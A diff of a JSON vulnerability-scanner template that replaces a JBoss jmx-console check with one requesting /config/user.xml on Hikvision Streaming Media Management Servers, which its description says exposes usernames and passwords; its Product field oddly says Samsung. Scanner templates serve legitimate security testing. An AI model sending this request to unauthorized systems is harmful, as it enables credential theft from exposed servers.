@@ -1,13 +1,13 @@
 {
-    "Name": "jboss-unauth",
-    "Description": "jboss-unauth, unauthorized access vulnerability",
-    "Product": "jboss",
+    "Name": "Hikvision Streaming Media Management Server Sensitive Information Disclosure",
+    "Description": "Hikvision Streaming Media Management Server sensitive information disclosure, can obtain usernames and passwords",
+    "Product": "Samsung",
     "author": "chumeng",
     "Request":[
         {
         "Method": "GET",
         "Header": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36"},
-        "Uri":"/jmx-console/",
+        "Uri":"/config/user.xml",
         "Port":"",
         "Data":"",
         "Follow_redirects":"false",
@@ -18,12 +18,8 @@
                 {
                 "Operation": "contains", 
                 "Key":"",
-                "Value": "jboss.management.local"
-                }, {
-                    "Operation": "contains", 
-                    "Key":"",
-                    "Value": "jboss.web"
-                    },
+                "Value": "131541111"
+                },
                  {
                 "Operation": "code", 
                 "Key":"",
